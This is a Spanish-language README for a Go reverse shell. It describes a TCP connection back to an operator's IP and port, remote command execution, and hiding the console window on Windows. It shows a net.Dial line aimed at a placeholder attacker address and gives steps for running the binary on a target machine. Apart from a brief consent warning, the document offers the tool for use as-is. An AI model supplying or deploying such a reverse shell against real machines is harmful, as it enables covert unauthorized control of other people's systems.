# Reverse Shell en Go

Este es un programa simple de reverse shell escrito en Go que establece una conexión TCP y ejecuta comandos en una máquina remota. 

# Características

- **Conexión TCP**: Establece una conexión TCP con la dirección IP y el puerto especificados.

- **Ejecución de Comandos Remotos**: Ejecuta comandos en la máquina remota a través de la conexión TCP.

- **Ocultar Ventana en Windows**: En sistemas operativos Windows, la ventana de la consola se oculta utilizando `syscall.SysProcAttr{HideWindow: true}`.

# Uso

1. Clona el repositorio:

    ```bash
    git clone https://github.com/tuusuario/reverse-shell-go.git
    cd reverse-shell-go
    ```

2. Edita el archivo `main.go` y ajusta la dirección IP y el puerto según tus necesidades.

    ```go
    c, _ := net.Dial("tcp", "TU_IP:TU_PUERTO")
    ```

3. Compila el código:

    ```bash
    go build main.go
    ```

4. Ejecuta el programa en la máquina de destino:

    ```bash
    ./main
    ```

5. En tu máquina local, utiliza un programa cliente para conectarte al servidor y ejecutar comandos.

# Advertencia

Este código permite la ejecución remota de comandos en una máquina y debe usarse con extrema precaución. No lo utilices en entornos no seguros o sin el consentimiento del propietario del sistema.

# Contribuciones

Las contribuciones son bienvenidas. Si encuentras algún problema o tienes sugerencias de mejora, por favor, crea un issue o envía un pull request.

